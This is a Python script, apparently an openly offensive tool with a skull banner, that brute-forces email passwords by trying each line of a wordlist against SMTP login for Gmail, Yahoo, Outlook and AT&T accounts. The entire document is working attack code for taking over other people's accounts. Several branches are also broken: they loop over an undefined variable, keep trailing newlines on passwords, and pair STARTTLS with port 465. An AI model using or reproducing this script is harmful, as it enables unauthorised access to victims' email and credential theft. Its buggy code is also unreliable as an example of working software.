import smtplib
from six.moves import input
from colorama import Fore, Back, Style 
import time

print("                 uuuuuuu                   ")
print("            uu$$$$$$$$$$$$uu               ")
print("          u$$$$$$$$$$$$$$$$$$u             ")
print("         uu$$$$$$$$$$$$$$$$$$uu            ")
print("        $$$$$$$$$$$$$$$$$$$$$$$$$          ")
print("        $$$$$$$$$$$$$$$$$$$$$$$$$          ")
print("        $$$$$      u$u       $$$$          ")
print("        $$$u       u$u       u$$$          ")
print("        $$$u      u$$$u      u$$$          ")
print("         $$$$$uu$$$   $$$uu$$$$            ")
print("          $$$$$$$$     $$$$$$$             ")
print("            u$$$$$$$u$$$$$$$u              ")
print("             u$ $ $ $ $ $ $u               ")
print("  uuu        $$u$ $ $ $ $u$$       uuu     ")
print(" u$$$$        $$$$$u$u$u$$$       u$$$$    ")
print("  $$$$$uu       $$$$$$$$$      uu$$$$$$    ")
print("u$$$$$$$$$$$uu             uuuu$$$$$$$$$$  ")
print("$$$$$$$$$$$$$$$$$uuu   uu$$$$$$$$$$$$$$$   ")
print("            $$$$$$$$$$$$$$uu               ")
print("           uuuu$$$$$$$$$$$$uuu             ")
print("  u$$$uuu$$$$$$$$$uu$$$$$$$$$$$$$$uuu$$$   ")
print("  $$$$$$$$$$$              $$$$$$$$$$$$$   ")
print("    $$$$$$                      $$$$$$     ")
print("     $$$                         $$$$      ")
print("[1] GMAIL           [2]Yahoo")
print("[3] OUTLOOK         [4]AT&T ")
op = input("CHOOSE OPTION:")
if op == '1': 
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    
    user = input("Enter Gmail: ")
    passwfile = input("Enter Wordlist: ")
    passwfile = open(passwfile, "r")
    
    for password in passwfile:
        try:
            smtpserver.login(user, password)
            print("[+] Password Found: %s" % password)
            time.sleep(3)
            break;
        except smtplib.SMTPAuthenticationError:
            print("[!] Password Incorrect: %s" % password)

if op =='2':
    smtpserver2 = smtplib.SMTP("smtp.mail.yahoo.com",587)
    smtpserver2.ehlo()
    smtpserver2.starttls()
    
    user = input("Enter Yahoo Email: ")
    passfile = input("Enter Wordlist: ")
    passfile = open(passfile, "r")
    
    for password in passwfile:
        try:
            smtpserver2.login(user, password)
            print("[+] Password Found: %s" % password)
            time.sleep(3)
            break;
        except smtplib.SMTPAuthenticationError:
            print("[!] Password Incorrect: %s" % password)

if op =='3':
    smtpserver3 = smtplib.SMTP("smtp.mail.outlook.com",587)
    smtpserver3.ehlo()
    smtpserver3.starttls()
    
    user = input("Enter Outlook Email: ")
    passfile = input("Enter Wordlist: ")
    passfile = open(passfile, "r")
    
    for password in passwfile:
        try:
            smtpserver3.login(user, password)
            print("[+] Password Found: %s" % password)
            time.sleep(3)
            break;
        except smtplib.SMTPAuthenticationError:
            print("[!] Password Incorrect: %s" % password)

if op =='4':
    smtpserver4 = smtplib.SMTP("smtp.mail.att.net",465)
    smtpserver4.ehlo()
    smtpserver4.starttls()
    
    user = input("Enter AT&T Email: ")
    passfile = input("Enter Wordlist: ")
    passfile = open(passfile, "r")
    
    for password in passwfile:
        try:
            smtpserver4.login(user, password)
            print("[+] Password Found: %s" % password)
            time.sleep(3)
            break;
        except smtplib.SMTPAuthenticationError:
            print("[!] Password Incorrect: %s" % password)
